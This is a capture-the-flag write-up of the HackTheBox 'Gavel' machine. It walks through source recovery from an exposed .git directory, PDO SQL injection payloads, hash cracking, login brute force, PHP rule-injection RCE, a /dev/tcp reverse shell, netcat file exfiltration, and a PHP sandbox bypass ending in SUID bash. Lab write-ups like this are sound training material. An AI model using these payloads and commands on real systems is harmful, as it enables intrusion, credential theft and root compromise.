---
icon: gavel
cover: ../../../../.gitbook/assets/Screenshot 2026-03-17 211803.png
coverY: 14.083595223130105
---

# HTB-GAVEL

### Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

#### Port Scan

```
┌──(sn0x㉿sn0x)-[~/HTB/Gavel]
└─$ rustscan -a 10.129.193.123 -- blah blah
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 1f:de:9d:84:bf:a1:64:be:1f:36:4f:ac:3c:52:15:92 (ECDSA)
|_  256 70:a5:1a:53:df:d1:d0:73:3e:9d:90:ad:c1:aa:b4:19 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://gavel.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: gavel.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two ports. SSH and HTTP. The web server is immediately redirecting to `gavel.htb` so before I can even browse the site I need to sort out `/etc/hosts`.

```
┌──(sn0x㉿sn0x)-[~/HTB/Gavel]
└─$ echo "10.129.193.123 gavel.htb" | sudo tee -a /etc/hosts
```

OpenSSH 8.9p1 on Ubuntu 3ubuntu0.13 points to Ubuntu 22.04 Jammy. Both ports showing TTL 63 confirms Linux one hop away. Nothing surprising yet, but re-running the scan with the actual hostname instead of the IP reveals something the first scan missed entirely.

```
┌──(sn0x㉿sn0x)-[~/HTB/Gavel]
└─$ nmap -p 80 --script=http-enum,http-title -sV gavel.htb
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52
| http-git:
|   10.129.193.123:80/.git/
|     Git repository found!
|     .git/config matched patterns 'user'
|     Repository description: Unnamed repository; edit this file...
|_    Last commit message: ..
```

Oh that's a lovely finding. A `.git` directory sitting wide open on the webserver. That means someone deployed their application to production and just... left the entire git history accessible. We can pull the full source code, commit history, config files, everything. This is probably going to give us a lot.

#### Vhost Discovery

```
┌──(sn0x㉿sn0x)-[~/HTB/Gavel]
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://gavel.htb/ -H "Host: FUZZ.gavel.htb" -fw 3487
```

Nothing. No subdomains. Moving on.

<figure><img src="../../../../.gitbook/assets/image (629).png" alt=""><figcaption></figcaption></figure>

#### What the Site Actually Is

Browsing `http://gavel.htb` lands on an auction platform. There's a home page showing random items, `/login.php`, and `/register.php` which gives a 50,000 coin signup bonus. After registering and poking around, logged-in users get access to a Bidding page and an Inventory page. Users with the `auctioneer` role also get an Admin Panel. That role distinction is already interesting just from the source code comment in the nav bar.

<figure><img src="../../../../.gitbook/assets/image (630).png" alt=""><figcaption></figcaption></figure>

***

### Source Code Recovery

#### Dumping the Git Repo

```
┌──(sn0x㉿sn0x)-[~/HTB/Gavel]
└─$ git-dumper http://gavel.htb/.git src/
```

```
[-] Testing http://gavel.htb/.git/HEAD [200]
[-] Testing http://gavel.htb/.git/ [200]
[-] Fetching .git recursively
[...snip...]
[-] Running git checkout .
Updated 1849 paths from the index
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Gavel/src]
└─$ ls
admin.php  assets  bidding.php  includes  index.php  inventory.php  login.php  logout.php  register.php  rules
```

Full source, locally. Now I can audit without touching the live site.

#### Git History and Config

```
┌──(sn0x㉿sn0x)-[~/HTB/Gavel/src]
└─$ git log --oneline
f67d907 (HEAD -> master) ..
2bd167f .
ff27a16 gavel auction ready
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Gavel/src]
└─$ git config --list
user.name=sado
user.email=sado@gavel.htb
```

Username `sado`, email `sado@gavel.htb`. The commit diffs between the three commits only show minor changes to `rules/default.yaml` — nothing credential-related in the history. But that username and email are good to keep in the back pocket.

#### Code Audit

Reading through the source, the application is PHP with MySQL through PDO. The interesting files are:

`includes/bid_handler.php`  handles bid submissions and is where the juicy stuff lives. `admin.php`  gated to users with role `auctioneer`, lets you edit auction rules. `inventory.php` has a sorting feature that immediately looks sketchy.

The most dangerous piece of code in the entire codebase is this block in `bid_handler.php`:

```php
$rule = $auction['rule'];

try {
    if (function_exists('ruleCheck')) {
        runkit_function_remove('ruleCheck');
    }
    runkit_function_add('ruleCheck', '$current_bid, $previous_bid, $bidder', $rule);
    $allowed = ruleCheck($current_bid, $previous_bid, $bidder);
} catch (Throwable $e) {
    $allowed = false;
}
```

`runkit_function_add` takes a raw PHP string and compiles it into a live function at runtime. Whatever is in the `rule` column of the `auctions` table gets executed as PHP. If I can get auctioneer credentials and use the admin panel to set a malicious rule, every bid placed on that auction triggers arbitrary PHP execution. The path is clear.

There's also a SQL injection in `inventory.php` which I'll document properly, and that's actually another route to get those auctioneer credentials.

***

### SQL Injection in inventory.php

The sort parameter handling is this:

```php
$sortItem = $_POST['sort'] ?? $_GET['sort'] ?? 'item_name';
$userId   = $_POST['user_id'] ?? $_GET['user_id'] ?? $_SESSION['user']['id'];
$col      = "`" . str_replace("`", "", $sortItem) . "`";

$stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC");
$stmt->execute([$userId]);
```

The `$col` variable gets injected directly into the prepared statement template string before PDO processes it. The backtick sanitization looks like protection but it's not — it removes backticks from input and wraps the result in backticks, but I can still inject a `?` character into the template.

The technique here is from Searchlight Cyber's writeup on PDO template smuggling. Sending `sort=\?;-- -` makes `$col` become `` `\?;-- -` ``, which creates this PDO template:

```sql
SELECT `\?;-- -` FROM inventory WHERE user_id = ? ORDER BY item_name ASC
```

Now there are two `?` placeholders but only one value is passed via `execute([$userId])`. PDO fills both slots with the `user_id` value. That value gets escaped and single-quoted by PDO — but the backslash I injected into the column name position escapes the opening quote, letting me break out of the string context and inject arbitrary SQL into `user_id`.

**POC - check DB version first:**

```
┌──(sn0x㉿sn0x)-[~/HTB/Gavel]
└─$ curl -s -b "gavel_session=<session>" "http://gavel.htb/inventory.php?sort=\?;--+-&user_id=x\`+FROM+(SELECT+VERSION()+AS+\`%27x\`)y;--+-"
```

That returns the MySQL version in the page. The injection works.

**Dump the users table:**

```
┌──(sn0x㉿sn0x)-[~/HTB/Gavel]
└─$ curl -s -b "gavel_session=<session>" "http://gavel.htb/inventory.php?sort=\?;--+-&user_id=x\`+FROM+(SELECT+concat(username,0x3a,password,0x3a,role)+AS+\`%27x\`+FROM+users)y;--+-"
```

Two users come back. My test account, and `auctioneer` with a `$2y$` bcrypt hash and role `auctioneer`.

**Crack the hash:**

```
┌──(sn0x㉿sn0x)-[~/HTB/Gavel]
└─$ echo '$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS' > auctioneer.hash
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Gavel]
└─$ hashcat -m 3200 auctioneer.hash /usr/share/wordlists/rockyou.txt
```

Mode 3200 is plain bcrypt `$2*$` — the `$2y$` prefix is PHP's variant of bcrypt and falls under this mode.

```
$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS:midnight1
```

Cracks in about 13 seconds. Credentials: `auctioneer:midnight1`.

***

### Getting Credentials the Manual Way Burp Intruder

Okay so the SQL injection route is slick but there's actually a completely separate way to get these creds that I also tried — straight up password brute force using Burp Intruder. Hear me out, it's more straightforward than it sounds, and the git repo already gave us the username `sado` and confirmed `auctioneer` is a valid account.

#### Capturing the Login Request

Open the browser through Burp proxy, go to `http://gavel.htb/login.php`, and submit a test login with username `auctioneer` and password `test`. Burp intercepts the POST.

The captured request looks like this:

```
POST /login.php HTTP/1.1
Host: gavel.htb
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

username=auctioneer&password=test
```

Right-click the request in Proxy, send it to Intruder.

#### Setting Up the Attack

In Intruder, go to the Positions tab. Hit "Clear §" to remove all auto-markers. Then highlight just the password value (`test`) and click "Add §". The request body should look like:

<figure><img src="../../../../.gitbook/assets/image (631).png" alt=""><figcaption></figcaption></figure>

```
username=auctioneer&password=§test§
```

Attack type: Sniper. One payload position, one wordlist exactly what I needed.

Over in the Payloads tab, payload type is Simple list. For a quick targeted attack I loaded a custom list of `midnight`-variant passwords since I already knew the developer email was `sado@gavel.htb` and people tend to use their username or something nearby. But you could also just load rockyou.txt and let it run.

<figure><img src="../../../../.gitbook/assets/image (632).png" alt=""><figcaption></figcaption></figure>

The payload list in the screenshot shows things like `midnight`, `midnight1`, `midnight12`, `midnight123`, `midnight01`, `midnight007`, etc.

#### Reading the Results

Hit Start attack and watch the results table.

Looking at the results, request 2 with payload `midnight1` stands out immediately — status code 302 instead of 200, and the response length is completely different (426 vs \~4990 for all the failed attempts). A 302 redirect means the server accepted the credentials and sent us to the logged-in home page. Everything else is a 200 which means the login form just reloaded with an error.

The bottom pane confirms it — the request shows `username=auctioneer&password=midnight1`.

So same credentials two different ways. `auctioneer:midnight1` it is.

***

### Shell as www-data

#### Logging In and Finding the Admin Panel

```
┌──(sn0x㉿sn0x)-[~/HTB/Gavel]
└─$ curl -i -X POST 'http://gavel.htb/login.php' -d "username=auctioneer&password=midnight1" -c cookies.txt -L
```

After logging in as `auctioneer` the Admin Panel link appears in the nav.&#x20;

Hitting `http://gavel.htb/admin.php` shows the three live auctions, each with an Edit button that exposes the rule and message fields. This is the exact thing the source code warned us about  the rule field goes straight into `runkit_function_add`.

#### Testing RCE with a Ping

Before throwing a shell at something, always verify execution cleanly first.

```
┌──(sn0x㉿sn0x)-[~/HTB/Gavel]
└─$ sudo tcpdump -ni tun0 icmp
```

In the Admin Panel, click Edit on any auction. Set the rule to:

```php
system('ping -c 1 10.10.14.43'); return true;
```

<figure><img src="../../../../.gitbook/assets/image (634).png" alt=""><figcaption></figcaption></figure>

Save it. Navigate to the Bidding page and place any bid on that auction :&#x20;

<figure><img src="../../../../.gitbook/assets/image (635).png" alt=""><figcaption></figcaption></figure>

```
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
ICMP echo request  from 10.129.193.123 to 10.10.14.43
ICMP echo reply    from 10.10.14.43    to 10.129.193.123
```

Clean execution as the web server. The `return true` at the end is there to satisfy the rule engine — without a valid boolean return the bid process errors out, but either way the `system()` call fires before that check.

#### Getting the Shell

```
┌──(sn0x㉿sn0x)-[~/HTB/Gavel]
└─$ penelope.py -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.0.7 • 172.17.0.1 • 172.18.0.1 • 10.10.14.43
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

Update the rule to:

```php
system('bash -c "bash -i >& /dev/tcp/10.10.14.43/4444 0>&1"'); return true;
```

Save, place a bid.

```
[+] Got reverse shell from gavel~10.129.193.123-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/sn0x/.penelope/sessions/gavel~10.129.193.123-Linux-x86_64/2025_11_29-21_46_08-579.log 📜
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[+] Got reverse shell from gavel~10.129.193.123-Linux-x86_64 😍 Assigned SessionID <2>

www-data@gavel:/var/www/html/gavel/includes$ 

```

***

### Lateral Movement to auctioneer

The web app uses `auctioneer:midnight1` to log in. SSH is blocked for this account — there's a `DenyUsers auctioneer` line in `sshd_config`. But `su` from the shell works fine.

```
www-data@gavel:/$ su - auctioneer
Password: midnight1
auctioneer@gavel:~$ id
uid=1001(auctioneer) gid=1002(auctioneer) groups=1002(auctioneer),1001(gavel-seller)
auctioneer@gavel:~$ groups
auctioneer gavel-seller
```

Two things stand out here. First, the obvious: credential reuse from web app to system is a classic lazy mistake. Second, and more interesting: the `gavel-seller` group. That's not a default Linux group, it's something custom. Worth investigating what that group has access to.

***

### Privilege Escalation to root

#### Enumeration

```
auctioneer@gavel:~$ ls -la /opt/gavel/
total 56
drwxr-xr-x 4 root root  4096 Nov  5 12:46 .
drwxr-xr-x 3 root root  4096 Nov  5 12:46 ..
drwxr-xr-x 3 root root  4096 Nov  5 12:46 .config
-rwxr-xr-- 1 root root 35992 Oct  3 19:35 gaveld
-rw-r--r-- 1 root root   364 Sep 20 14:54 sample.yaml
drwxr-x--- 2 root root  4096 Nov  5 12:46 submission
```

```
auctioneer@gavel:~$ ls -la /usr/local/bin/gavel-util
-rwxr-xr-x 1 root gavel-seller 17688 Oct  3 19:35 /usr/local/bin/gavel-util
```

```
auctioneer@gavel:~$ ps auxww | grep -v '\[' | grep root | grep -v grep
root        1001  0.0  0.0   7372  3504 ?  Ss  12:20  /bin/bash /root/scripts/auction_watcher.sh
root        1003  0.0  0.0  19128  3956 ?  Ss  12:20  /opt/gavel/gaveld
root        1011  0.3  0.4  26784 18212 ?  Ss  12:20  python3 /root/scripts/timeout_gavel.py
```

So `gaveld` is running as root. `gavel-util` is owned by `root:gavel-seller` and world-executable. The `auctioneer` user is in `gavel-seller`. This is clearly the escalation path.

```
auctioneer@gavel:~$ gavel-util
Usage: gavel-util <cmd> [options]
Commands:
  submit <file>           Submit new items (YAML format)
  stats                   Show Auction stats
  invoice                 Request invoice
```

```
auctioneer@gavel:~$ gavel-util stats
=================== GAVEL AUCTION DASHBOARD ===================

[Active Auctions]
ID   Item Name                      Current Bid   Ends In
1376 Haunted Quill                  965           00:24
1377 Mermaid's Toe                  857           01:02
1378 Goblet of Slight Insight       823           02:48
```

`submit` takes a YAML file with auction item data including a `rule` field. The sample shows the expected format:

```
auctioneer@gavel:~$ cat /opt/gavel/sample.yaml
---
item:
  name: "Dragon's Feathered Hat"
  description: "A flamboyant hat rumored to make dragons jealous."
  image: "https://example.com/dragon_hat.png"
  price: 10000
  rule_msg: "Your bid must be at least 20% higher."
  rule: "return ($current_bid >= $previous_bid * 1.2);"
```

So `gavel-util submit` sends YAML to `gaveld` which runs as root, and that daemon validates the `rule` field by actually executing the PHP. If I can get something malicious into that rule execution context, the PHP runs as root.

#### Binary Analysis

Let me pull both binaries for static analysis. Exfil over netcat:

```
auctioneer@gavel:~$ cat /usr/local/bin/gavel-util | nc 10.10.14.43 9001
auctioneer@gavel:~$ cat /opt/gavel/gaveld | nc 10.10.14.43 9002
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Gavel]
└─$ nc -lnvp 9001 > gavel-util
┌──(sn0x㉿sn0x)-[~/HTB/Gavel]
└─$ nc -lnvp 9002 > gaveld
```

Verify checksums match before analyzing:

```
┌──(sn0x㉿sn0x)-[~/HTB/Gavel]
└─$ md5sum gavel-util gaveld
5fbc1350c245a610b83841b5c581af86  gavel-util
ea2096a074a283828ae5615cddebc8e6  gaveld
```

Both match what's on the box. Load them into Ghidra.

**gavel-util internals**

`gavel-util` is just a client. It connects to a Unix socket at `/var/run/gaveld.sock`, reads the YAML file, builds a JSON header, and sends it. The wire format for `submit` is:

```
[4-byte big-endian length][JSON header][YAML content bytes]
```

The JSON header is `{"op":"submit","flags":"","content_length":N,"env":{...}}`. The `env` object gets populated with the client's environment variables. That `env` field is worth noting.

**gaveld internals**

The `main` function seeds a random number generator, creates the Unix socket at `/var/run/gaveld.sock`, and sets its permissions to `root:gavel-seller` with mode `0660`. Only processes in the `gavel-seller` group can connect — which is why `auctioneer` can use `gavel-util`.

The `handle_conn` function is where it gets interesting. It calls `getsockopt(SO_PEERCRED)` to verify the connecting process is in `gavel-seller`. Then it parses the incoming JSON, extracts the `op` field, and branches on the three commands.

For `submit`, after receiving and validating the YAML keys, it calls `php_safe_run()` to sandbox-evaluate the rule. Here's the critical decompiled section of `php_safe_run` — the PHP config file selection logic:

```c
// Default config path
strncpy(php_ini_path, "/opt/gavel/.config/php/php.ini", 0x1000);

// Try to get RULE_PATH from the env object in the JSON request
json_object_object_get_ex(request_json, "env", &env_obj);

if (env_obj != NULL && json_object_is_type(env_obj, json_type_object)) {
    json_object_object_get_ex(env_obj, "RULE_PATH", &rule_path_obj);
    if (rule_path_obj != NULL) {
        env_val = json_object_get_string(rule_path_obj);
        if (env_val != NULL && *env_val != '\0') {
            if (stat(env_val, &sb) == 0 &&
                (sb.st_mode & 0xf000) == 0x8000 &&   // is regular file
                access(env_val, R_OK) == 0) {          // is readable
                // Use attacker-controlled path instead
                strncpy(php_ini_path, env_val, 0x1000);
            }
        }
    }
}
```

The daemon reads `RULE_PATH` from the `env` object in the JSON request. If the path exists, is a regular file, and is readable, it becomes the php.ini for the sandbox execution. Since `gavel-util` serializes its environment variables into that `env` field, setting `RULE_PATH` in my shell environment before running `gavel-util` will make `gaveld` use whatever `php.ini` I point it at.

That's the intended path. There's also an unintended bypass using `file_put_contents` to directly overwrite the default config. I'll document both.

#### The PHP Sandbox

Default config at `/opt/gavel/.config/php/php.ini`:

```ini
engine=On
open_basedir=/opt/gavel
disable_functions=exec,shell_exec,system,passthru,popen,proc_open,proc_close,
  pcntl_exec,pcntl_fork,dl,ini_set,eval,assert,create_function,preg_replace,
  unserialize,extract,file_get_contents,fopen,include,require,require_once,
  include_once,fsockopen,pfsockopen,stream_socket_client
allow_url_fopen=Off
allow_url_include=Off
scan_dir=
```

Pretty locked down. `open_basedir` limits file access to `/opt/gavel`. Almost every dangerous function is in `disable_functions`. But — and this is what enables the unintended method — `file_put_contents` is not in that list. And `/opt/gavel/.config/php/php.ini` is within `open_basedir`. Oversight.

***

### Method 1: RULE\_PATH Environment Variable (Intended Path)

Write a permissive `php.ini` somewhere I control, point `RULE_PATH` at it, and the sandbox for my rule submission has no restrictions.

```
auctioneer@gavel:~$ cat > /dev/shm/myphp.ini << 'EOF'
engine=On
open_basedir=
disable_functions=
EOF
```

```
auctioneer@gavel:~$ cat > /dev/shm/pwn.yaml << 'EOF'
name: "privesc"
description: "get root"
image: "test.png"
price: 100000
rule_msg: "oops"
rule: "system('cp /bin/bash /home/auctioneer/rootbash; chmod 6777 /home/auctioneer/rootbash;'); return false;"
EOF
```

Using `return false` is fine — the `system()` call executes during sandbox validation, which happens before the return value matters for saving the file.

```
auctioneer@gavel:~$ RULE_PATH=/dev/shm/myphp.ini gavel-util submit /dev/shm/pwn.yaml
Item submitted for review in next auction
```

```
auctioneer@gavel:~$ ls -la ~/rootbash
-rwsrwsrwx 1 root root 1396520 Mar 11 00:29 /home/auctioneer/rootbash
```

SetUID, SetGID, owned by root. The `-p` flag prevents bash from dropping the effective UID when it detects it's running as a SUID binary.

```
auctioneer@gavel:~$ ./rootbash -p
rootbash-5.1# whoami
root
```

***

#### Method 2: Two-Hop via file\_put\_contents (Unintended)

Since `file_put_contents` isn't disabled and `open_basedir` includes `/opt/gavel/`, I can write a new php.ini from within the sandbox itself on the first submission, then use the now-unrestricted sandbox on a second submission.

**A quick note on why `/tmp` doesn't work here:** Apache's systemd service has `PrivateTmp=true`. That means processes descending from Apache — including the `www-data` shell and any `su` sessions started from it — see a private tmpfs namespace mounted over `/tmp`. If root writes to `/tmp` through `gaveld`, it goes to the real `/tmp`. But when we try to access that from the `auctioneer` shell (which descends from Apache), we're in the private namespace and `/tmp` looks empty. Use `/home/auctioneer/` or `/opt/gavel/` instead. This catches people out.

**Stage 1 — overwrite the config.** Do this part from the `www-data` reverse shell since that's where we can write files to paths `gavel-util` can reach:

```
www-data@gavel:/var/www/html/gavel$ cat > /var/www/html/gavel/step1.yaml << 'EOF'
name: "overwrite ini"
description: "stage 1"
image: "test.png"
price: 100000
rule_msg: "step1"
rule: "file_put_contents('/opt/gavel/.config/php/php.ini', 'engine=On\nopen_basedir=\ndisable_functions=\n'); return false;"
EOF
```

From the `auctioneer` shell:

```
auctioneer@gavel:~$ gavel-util submit /var/www/html/gavel/step1.yaml
Item submitted for review in next auction
```

```
auctioneer@gavel:~$ cat /opt/gavel/.config/php/php.ini
engine=On
open_basedir=
disable_functions=
```

Config overwritten. Next submission runs with zero restrictions.

**Stage 2 — get the SUID bash.** From `www-data` shell again:

```
www-data@gavel:/var/www/html/gavel$ cat > /var/www/html/gavel/step2.yaml << 'EOF'
name: "rootbash"
description: "stage 2"
image: "test.png"
price: 100000
rule_msg: "step2"
rule: "system('cp /bin/bash /home/auctioneer/rootbash2; chmod 6777 /home/auctioneer/rootbash2;'); return false;"
EOF
```

```
auctioneer@gavel:~$ gavel-util submit /var/www/html/gavel/step2.yaml
Item submitted for review in next auction
```

```
auctioneer@gavel:~$ ls -la ~/rootbash2
-rwsrwsrwx 1 root root 1396520 Mar  6 23:00 /home/auctioneer/rootbash2

auctioneer@gavel:~$ ./rootbash2 -p
rootbash2-5.1# id
uid=1001(auctioneer) gid=1002(auctioneer) euid=0(root) groups=1002(auctioneer),1001(gavel-seller)
rootbash2-5.1# cat /root/root.txt
```

***

### Attack Flow

```
Exposed .git directory at http://gavel.htb/.git/
              |
              v
        git-dumper
              |
              +---> Full source code recovered
              |            |
              |            v
              |     developer email: sado@gavel.htb
              |     username confirmed: auctioneer
              |
              v
     Two parallel paths to credentials:
              |
     +--------+--------+
     |                 |
     v                 v
SQL Injection        Burp Intruder
inventory.php        Sniper Attack
sort param           against /login.php
     |               (auctioneer + rockyou)
     |                 |
     v                 v
auctioneer bcrypt   middleware:
hash dumped         midnight1 -> 302 redirect
     |               highlights in results
     v
hashcat -m 3200
     |
     v
     Both paths: auctioneer:midnight1
              |
              v
        Login to web app
              |
              v
        Admin Panel -> Edit auction rule
              |
              v
   runkit_function_add executes raw PHP
   (system() in rule -> ping confirms RCE)
              |
              v
   Reverse shell as www-data
              |
              v
   su auctioneer (credential reuse)
              |
              v
   gavel-seller group -> gavel-util access
   gaveld socket accessible
              |
      +-------+-------+
      |               |
      v               v
 RULE_PATH env    file_put_contents
 (intended)       overwrites php.ini
      |           (unintended, 2 stages)
      |               |
      +-------+-------+
              |
              v
   PHP sandbox unrestricted
   system() executes as root
              |
              v
   cp /bin/bash -> chmod 6777 -> SUID bash
              |
              v
   ./rootbash -p -> euid=0
              |
              v
        root.txt
```

***

### Techniques

| Technique                                          | Where Used                                                              |
| -------------------------------------------------- | ----------------------------------------------------------------------- |
| Exposed `.git` directory recovery (git-dumper)     | Source code and developer info extraction                               |
| PDO template smuggling via `?` injection           | SQL injection in `inventory.php` sort parameter                         |
| bcrypt cracking, hashcat mode 3200                 | Recovering `auctioneer` password from dumped hash                       |
| Burp Intruder Sniper attack                        | Password brute force on `/login.php` — 302 vs 200 distinguishes success |
| PHP code injection via `runkit_function_add`       | RCE through auction rule engine on bid placement                        |
| Out-of-band RCE verification (ICMP ping + tcpdump) | Confirming code execution before sending shell                          |
| Credential reuse                                   | Pivoting from www-data to auctioneer via `su`                           |
| Binary reverse engineering (Ghidra)                | Discovering `RULE_PATH` env var handling in `gaveld`                    |
| Environment variable injection via `RULE_PATH`     | Bypassing PHP sandbox with attacker-controlled `php.ini`                |
| `file_put_contents` sandbox bypass                 | Overwriting `php.ini` from within restricted PHP execution              |
| SUID bash (`chmod 6777` + `-p` flag)               | Gaining root shell after privileged command execution                   |
| `PrivateTmp` namespace awareness                   | Understanding why `/tmp` targets fail from Apache-descended processes   |

<figure><img src="../../../../.gitbook/assets/complete (38).gif" alt=""><figcaption></figcaption></figure>
